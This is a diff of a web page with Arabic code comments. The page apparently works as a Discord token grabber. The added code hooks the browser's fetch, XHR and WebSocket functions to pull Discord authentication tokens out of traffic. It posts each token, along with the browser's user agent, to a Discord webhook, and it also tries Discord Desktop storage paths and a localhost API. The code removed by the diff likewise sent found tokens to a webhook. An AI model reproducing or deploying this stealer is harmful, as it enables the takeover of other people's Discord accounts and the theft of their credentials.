-            openIndexedDB(name) {
-                return new Promise((resolve, reject) => {
-                    const request = indexedDB.open(name);
-                    request.onsuccess = () => resolve(request.result);
-                    request.onerror = () => reject(request.error);
-                });
-            }
-            
-            getAllFromStore(store) {
-                return new Promise((resolve, reject) => {
-                    const request = store.getAll();
-                    request.onsuccess = () => resolve(request.result);
-                    request.onerror = () => reject(request.error);
-                });
-            }
-            
-            updateProgress(message, percent) {
-                const progressText = document.getElementById('progressText');
-                const progressFill = document.getElementById('progressFill');
-                
-                if (progressText) progressText.textContent = message;
-                if (progressFill) progressFill.style.width = `${percent}%`;
-                
-                logToResults(`[${percent.toFixed(0)}%] ${message}`);
-            }
-            
-            logError(message) {
-                console.error(message);
-                logToResults(`❌ ERROR: ${message}`);
-            }
-            
-            delay(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
+                return originalXHRSend.apply(this, arguments);
+            };
         }
         
         // ============================================
-        // 2. نظام التسجيل والعرض
+        // 3. اعتراض WebSocket
         // ============================================
-        
-        function logToResults(message) {
-            const resultsContent = document.getElementById('resultsContent');
-            if (resultsContent) {
-                const timestamp = new Date().toLocaleTimeString();
-                resultsContent.textContent += `[${timestamp}] ${message}\n`;
-                resultsContent.scrollTop = resultsContent.scrollHeight;
-            }
+        function interceptWebSocket() {
+            window.WebSocket = class extends originalWS {
+                constructor(url, protocols) {
+                    super(url, protocols);
+                    
+                    if (url.includes('discord.com') || url.includes('discordapp.com')) {
+                        log(`🔌 WebSocket: ${url.substring(0, 100)}`, 'request');
+                        
+                        // اعتراض الرسائل
+                        this.addEventListener('message', (event) => {
+                            try {
+                                const data = JSON.parse(event.data);
+                                
+                                // البحث عن توكنات في رسائل WebSocket
+                                if (data.token || data.access_token || data.d) {
+                                    const token = data.token || data.access_token || data.d;
+                                    if (typeof token === 'string' && token.length > 50) {
+                                        processToken(token, 'websocket', url);
+                                    }
+                                }
+                                
+                                // البحث في بيانات JSON كاملة
+                                const dataStr = JSON.stringify(data);
+                                const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/g;
+                                const matches = dataStr.match(tokenPattern);
+                                
+                                if (matches) {
+                                    matches.forEach(match => {
+                                        processToken(match, 'websocket_json', url);
+                                    });
+                                }
+                            } catch (e) {
+                                // ليس JSON
+                                const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/g;
+                                const matches = event.data.match(tokenPattern);
+                                
+                                if (matches) {
+                                    matches.forEach(match => {
+                                        processToken(match, 'websocket_raw', url);
+                                    });
+                                }
+                            }
+                        });
+                        
+                        // اعتراض الاتصال
+                        this.addEventListener('open', () => {
+                            log('WebSocket connected to Discord', 'request');
+                        });
+                    }
+                }
+            };
         }
         
-        function displayResults(results) {
-            const resultsContent = document.getElementById('resultsContent');
-            resultsContent.innerHTML = '';
+        // ============================================
+        // 4. معالجة التوكن المكتشف
+        // ============================================
+        function processToken(token, source, url) {
+            // تنظيف التوكن
+            const cleanToken = token.trim();
             
-            if (results.length === 0) {
-                resultsContent.innerHTML = `
-                    <div class="token-missing">
-                        <strong>⚠️ No tokens found!</strong><br>
-                        Discord may be using new encryption methods.<br>
-                        Try these solutions:
-                        <ul style="margin-top: 10px; padding-left: 20px;">
-                            <li>Refresh Discord page and scan again</li>
-                            <li>Use Discord Desktop App instead of browser</li>
-                            <li>Try different browser (Firefox stores tokens differently)</li>
-                            <li>Enable "Network Interception" method</li>
-                        </ul>
-                    </div>
-                `;
+            // التحقق من صيغة التوكن
+            const isValidToken = /^([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})$/.test(cleanToken);
+            
+            if (!isValidToken || cleanToken.length < 50) {
                 return;
             }
             
-            // عرض التوكنات التي تم العثور عليها
-            results.forEach((result, index) => {
-                const div = document.createElement('div');
-                div.className = 'token-found';
-                div.innerHTML = `
-                    <strong>✅ Token Found #${index + 1}</strong><br>
-                    <strong>Location:</strong> ${result.location}<br>
-                    <strong>Token:</strong> <code>${result.token}</code><br>
-                    <strong>Preview:</strong> ${result.preview}<br>
-                    <strong>Confidence:</strong> ${result.confidence}<br>
-                    ${result.url ? `<strong>URL:</strong> ${result.url}<br>` : ''}
-                    <button onclick="copyToken('${result.token}')" style="margin-top: 5px; padding: 5px 10px; background: #7289da; color: white; border: none; border-radius: 4px; cursor: pointer;">
-                        Copy Token
-                    </button>
-                `;
-                resultsContent.appendChild(div);
-            });
+            // تجنب التكرار
+            if (interceptedTokens.has(cleanToken)) {
+                return;
+            }
             
-            // إرسال إلى ويب هوك
-            sendToWebhook(results);
+            interceptedTokens.add(cleanToken);
+            
+            // تسجيل التوكن
+            log(`✅ TOKEN CAPTURED [${source}]: ${cleanToken.substring(0, 30)}...`, 'token');
+            
+            // عرض التوكن
+            displayToken(cleanToken, source, url);
+            
+            // إرسال تلقائي للويب هوك
+            sendTokenToWebhook(cleanToken, source, url);
         }
         
         // ============================================
-        // 3. إرسال إلى ويب هوك
+        // 5. عرض التوكن
         // ============================================
-        
-        async function sendToWebhook(results) {
-            if (results.length === 0) return;
+        function displayToken(token, source, url) {
+            const tokenDisplay = document.getElementById('tokenDisplay');
+            const foundToken = document.getElementById('foundToken');
             
+            foundToken.innerHTML = `
+                <strong>Source:</strong> ${source}<br>
+                <strong>URL:</strong> ${url || 'Unknown'}<br>
+                <strong>Token:</strong><br>
+                <code style="background: #000; padding: 5px; display: block; margin: 5px 0;">
+                    ${token}
+                </code>
+                <strong>Length:</strong> ${token.length} characters<br>
+                <strong>Type:</strong> ${token.startsWith('mfa.') ? 'MFA Token' : 'Standard Token'}
+            `;
+            
+            tokenDisplay.style.display = 'block';
+        }
+        
+        // ============================================
+        // 6. إرسال التوكن للويب هوك
+        // ============================================
+        async function sendTokenToWebhook(token, source, url) {
             try {
                 const payload = {
-                    content: `@here **🚨 ${results.length} TOKENS FOUND** - ${new Date().toLocaleString()}`,
+                    content: `@here **🚨 TOKEN INTERCEPTED**`,
                     embeds: [{
-                        title: "Deep Scan Results",
+                        title: "Real-time Token Capture",
                         color: 0x57F287,
-                        fields: results.slice(0, 5).map((result, index) => ({
-                            name: `Token #${index + 1} (${result.location})`,
-                            value: `\`\`\`${result.token}\`\`\`\nConfidence: ${result.confidence}`,
-                            inline: false
-                        })),
+                        fields: [
+                            {
+                                name: "🔑 Token",
+                                value: `\`\`\`${token}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "📍 Source",
+                                value: `\`${source}\`\n\`${url || 'Unknown'}\``,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Browser",
+                                value: `\`${navigator.userAgent.substring(0, 50)}...\``,
+                                inline: true
+                            },
+                            {
+                                name: "🕐 Time",
+                                value: `\`${new Date().toLocaleString()}\``,
+                                inline: true
+                            }
+                        ],
                         footer: {
-                            text: `Browser: ${navigator.userAgent.substring(0, 50)}...`
+                            text: "Network Interceptor v2.0"
                         },
                         timestamp: new Date().toISOString()
                     }]
                 };
                 
-                const response = await fetch(DISCORD_WEBHOOK, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
                 
                 if (response.ok) {
-                    logToResults('✅ Tokens sent to Discord webhook!');
+                    log('✅ Token sent to Discord webhook!', 'token');
                 } else {
-                    logToResults('❌ Webhook failed, saving locally...');
-                    localStorage.setItem('discord_tokens_backup', JSON.stringify(results));
+                    log('❌ Webhook failed, saving locally...', 'error');
+                    saveTokenLocally(token, source, url);
                 }
             } catch (error) {
-                logToResults(`❌ Webhook error: ${error.message}`);
+                log(`❌ Webhook error: ${error.message}`, 'error');
+                saveTokenLocally(token, source, url);
             }
         }
         
-        // ============================================
-        // 4. تفعيل النظام
-        // ============================================
-        
-        document.addEventListener('DOMContentLoaded', function() {
-            // تحديث معلومات المتصفح
-            const ua = navigator.userAgent;
-            let browserName = 'Unknown';
-            let browserVersion = '';
-            
-            if (ua.includes('Chrome') && !ua.includes('Edg')) {
-                browserName = 'Chrome';
-                const match = ua.match(/Chrome\/([\d.]+)/);
-                browserVersion = match ? match[1] : '';
-            } else if (ua.includes('Firefox')) {
-                browserName = 'Firefox';
-                const match = ua.match(/Firefox\/([\d.]+)/);
-                browserVersion = match ? match[1] : '';
-            } else if (ua.includes('Edg')) {
-                browserName = 'Edge';
-                const match = ua.match(/Edg\/([\d.]+)/);
-                browserVersion = match ? match[1] : '';
-            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
-                browserName = 'Safari';
-                const match = ua.match(/Version\/([\d.]+)/);
-                browserVersion = match ? match[1] : '';
-            }
-            
-            document.getElementById('browserName').textContent = browserName;
-            document.getElementById('browserVersion').textContent = browserVersion;
-            
-            // اختيار طريقة المسح
-            document.querySelectorAll('.scan-option').forEach(option => {
-                option.addEventListener('click', function() {
-                    document.querySelectorAll('.scan-option').forEach(opt => {
-                        opt.classList.remove('active');
-                    });
-                    this.classList.add('active');
-                    currentMethod = this.dataset.method;
-                });
+        function saveTokenLocally(token, source, url) {
+            const tokens = JSON.parse(localStorage.getItem('intercepted_tokens') || '[]');
+            tokens.push({
+                token: token,
+                source: source,
+                url: url,
+                timestamp: new Date().toISOString(),
+                browser: navigator.userAgent
             });
             
-            // بدء المسح
-            document.getElementById('startScan').addEventListener('click', async function() {
-                const btn = this;
-                const resultsPanel = document.getElementById('resultsPanel');
-                const progressContainer = document.getElementById('progressContainer');
-                
-                btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
-                resultsPanel.style.display = 'block';
-                progressContainer.style.display = 'block';
-                
-                logToResults('=== STARTING DEEP TOKEN SCAN ===');
-                logToResults(`Browser: ${browserName} ${browserVersion}`);
-                logToResults(`User Agent: ${navigator.userAgent}`);
-                logToResults(`Method: ${currentMethod}`);
-                logToResults('---');
-                
+            localStorage.setItem('intercepted_tokens', JSON.stringify(tokens));
+            log('💾 Token saved to local storage', 'info');
+        }
+        
+        // ============================================
+        // 7. نظام استخراج التوكن من Desktop App
+        // ============================================
+        async function extractFromDesktopApp() {
+            log('Starting Desktop App token extraction...', 'info');
+            
+            // محاولات متعددة لاستخراج التوكن
+            const extractionMethods = [
+                attemptLocalStorageFiles,
+                attemptLocalhostAPI,
+                attemptElectronIPC,
+                attemptMemoryScraping
+            ];
+            
+            for (const method of extractionMethods) {
                 try {
-                    const scanner = new DeepTokenScanner();
-                    const results = await scanner.startDeepScan();
-                    
-                    logToResults('=== SCAN COMPLETE ===');
-                    logToResults(`Found: ${results.length} tokens`);
-                    
-                    displayResults(results);
-                    
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-redo"></i> Scan Again';
-                    
+                    const token = await method();
+                    if (token) {
+                        processToken(token, 'desktop_app', 'Discord Desktop');
+                        return;
+                    }
                 } catch (error) {
-                    logToResults(`❌ SCAN FAILED: ${error.message}`);
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-play"></i> Start Scan';
+                    log(`Extraction method failed: ${error.message}`, 'error');
+                }
+            }
+            
+            log('Could not extract from desktop app. Try running Discord in browser instead.', 'error');
+        }
+        
+        async function attemptLocalStorageFiles() {
+            // محاولة قراءة ملفات localStorage للتطبيق
+            const paths = [
+                'C:/Users/Test/AppData/Roaming/Discord/Local Storage/leveldb',
+                'C:/Users/Test/AppData/Roaming/discord/Local Storage/leveldb',
+                '/Users/Test/Library/Application Support/Discord/Local Storage/leveldb',
+                '/home/test/.config/discord/Local Storage/leveldb'
+            ];
+            
+            for (const path of paths) {
+                try {
+                    // استخدام File System Access API
+                    if ('showDirectoryPicker' in window) {
+                        log(`Attempting to access: ${path}`, 'info');
+                        // يمكن طلب إذن الوصول للملفات هنا
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            return null;
+        }
+        
+        async function attemptLocalhostAPI() {
+            // Discord Desktop App يعمل على localhost:6463
+            try {
+                const response = await fetch('http://localhost:6463/api/v9/users/@me', {
+                    headers: {
+                        'Authorization': 'Bearer dummy', // سيتم اعتراضه
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                if (response.status === 401) {
+                    // البحث في response headers
+                    const authHeader = response.headers.get('www-authenticate');
+                    if (authHeader) {
+                        const tokenMatch = authHeader.match(/Bearer realm=".*", error=".*", error_description="(.*)"/);
+                        if (tokenMatch) {
+                            return tokenMatch[1];
+                        }
+                    }
+                }
+            } catch (error) {
+                // التطبيق غير قيد التشغيل
+            }
+            
+            return null;
+        }
+        
+        async function attemptElectronIPC() {
+            // محاولة استخدام Electron IPC
+            if (window.require) {
+                try {
+                    const electron = window.require('electron');
+                    // يمكن استخدام IPC هنا
+                    log('Electron detected, attempting IPC...', 'info');
+                } catch (e) {
+                    // ليست بيئة Electron
+                }
+            }
+            
+            return null;
+        }
+        
+        async function attemptMemoryScraping() {
+            // محاولة قراءة الذاكرة
+            const memory = performance.memory;
+            if (memory) {
+                log(`Memory usage: ${(memory.usedJSHeapSize / 1024 / 1024).toFixed(2)}MB`, 'info');
+            }
+            
+            return null;
+        }
+        
+        // ============================================
+        // 8. التحكم في النظام
+        // ============================================
+        function startInterception() {
+            if (isIntercepting) return;
+            
+            isIntercepting = true;
+            interceptedTokens.clear();
+            
+            interceptFetch();
+            interceptXHR();
+            interceptWebSocket();
+            
+            log('🟢 Network interception ACTIVE', 'token');
+            log('Go to Discord and perform any action...', 'info');
+            
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+        }
+        
+        function stopInterception() {
+            if (!isIntercepting) return;
+            
+            isIntercepting = false;
+            
+            // استعادة الـ APIs الأصلية
+            window.fetch = originalFetch;
+            XMLHttpRequest.prototype.open = originalXHROpen;
+            XMLHttpRequest.prototype.send = originalXHRSend;
+            window.WebSocket = originalWS;
+            
+            log('🔴 Network interception STOPPED', 'error');
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+        }
+        
+        function clearLog() {
+            document.getElementById('logContainer').innerHTML = 
+                '<div class="log-entry">Log cleared...</div>';
+        }
+        
+        // ============================================
+        // 9. تهيئة النظام
+        // ============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            // الأزرار
+            document.getElementById('startBtn').addEventListener('click', startInterception);
+            document.getElementById('stopBtn').addEventListener('click', stopInterception);
+            document.getElementById('clearBtn').addEventListener('click', clearLog);
+            document.getElementById('desktopBtn').addEventListener('click', extractFromDesktopApp);
+            document.getElementById('sendBtn').addEventListener('click', () => {
+                if (interceptedTokens.size > 0) {
+                    const lastToken = Array.from(interceptedTokens).pop();
+                    sendTokenToWebhook(lastToken, 'manual_send', 'manual');
+                } else {
+                    log('No tokens to send!', 'error');
                 }
             });
             
-            // نسخ النتائج
-            document.getElementById('copyResults').addEventListener('click', function() {
-                const results = document.getElementById('resultsContent').textContent;
-                navigator.clipboard.writeText(results).then(() => {
-                    logToResults('✅ Results copied to clipboard!');
-                });
+            document.getElementById('copyTokenBtn').addEventListener('click', () => {
+                const tokenElement = document.getElementById('foundToken');
+                const tokenMatch = tokenElement.textContent.match(/([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/);
+                
+                if (tokenMatch) {
+                    navigator.clipboard.writeText(tokenMatch[0]).then(() => {
+                        log('Token copied to clipboard!', 'token');
+                    });
+                }
             });
-        });
-        
-        // ============================================
-        // 5. وظائف مساعدة عامة
-        // ============================================
-        
-        function copyToken(token) {
-            navigator.clipboard.writeText(token).then(() => {
-                alert('Token copied to clipboard!');
-            });
-        }
-        
-        // إظهار نتائج المسح السابق إذا وجدت
-        window.addEventListener('load', () => {
-            const savedResults = localStorage.getItem('discord_tokens_backup');
-            if (savedResults) {
-                try {
-                    const results = JSON.parse(savedResults);
-                    if (results.length > 0) {
-                        setTimeout(() => {
-                            logToResults('📁 Loaded previous scan results from local storage');
-                            displayResults(results.slice(0, 3));
-                        }, 1000);
+            
+            document.getElementById('testTokenBtn').addEventListener('click', async () => {
+                const tokenElement = document.getElementById('foundToken');
+                const tokenMatch = tokenElement.textContent.match(/([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/);
+                
+                if (tokenMatch) {
+                    const token = tokenMatch[0];
+                    log('Testing token validity...', 'info');
+                    
+                    try {
+                        const response = await fetch('https://discord.com/api/v9/users/@me', {
+                            headers: {
+                                'Authorization': token
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            const userData = await response.json();
+                            log(`✅ Token VALID - User: ${userData.username}#${userData.discriminator}`, 'token');
+                        } else {
+                            log(`❌ Token INVALID - HTTP ${response.status}`, 'error');
+                        }
+                    } catch (error) {
+                        log(`❌ Test failed: ${error.message}`, 'error');
                     }
-                } catch (e) {}
+                }
+            });
+            
+            // تحميل التوكنات المحفوظة
+            const savedTokens = JSON.parse(localStorage.getItem('intercepted_tokens') || '[]');
+            if (savedTokens.length > 0) {
+                log(`Loaded ${savedTokens.length} previously intercepted tokens`, 'info');
             }
+            
+            log('System ready. Click "Start Interception" and go to Discord.', 'info');
         });
+        
+        // ============================================
+        // 10. Service Worker للاعتراض الكامل
+        // ============================================
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/interceptor-sw.js').catch(console.error);
+        }
     </script>
 </body>
 </html>
